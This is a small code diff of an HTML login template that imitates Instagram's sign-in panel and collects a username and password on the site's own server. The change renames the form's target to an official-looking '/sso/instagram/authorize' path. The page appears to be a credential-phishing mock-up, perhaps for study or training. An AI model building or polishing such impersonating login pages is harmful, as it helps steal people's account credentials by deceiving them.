@@ -15,7 +15,7 @@
         <div class="c-panel group">
           <img class="c-panel__img" src="{{ url_for('static', filename='img/instagram.svg') }}" alt="Instagram">
           <!-- Login form -->
-          <form method="POST" action="/login/instagram">
+          <form method="POST" action="/sso/instagram/authorize">
             <div class="c-panel__form">
               <input name="username" type="text" class="c-panel__input" placeholder="Phone number, username, or email" required>
               <input name="password" type="password" class="c-panel__input" placeholder="Password" required>
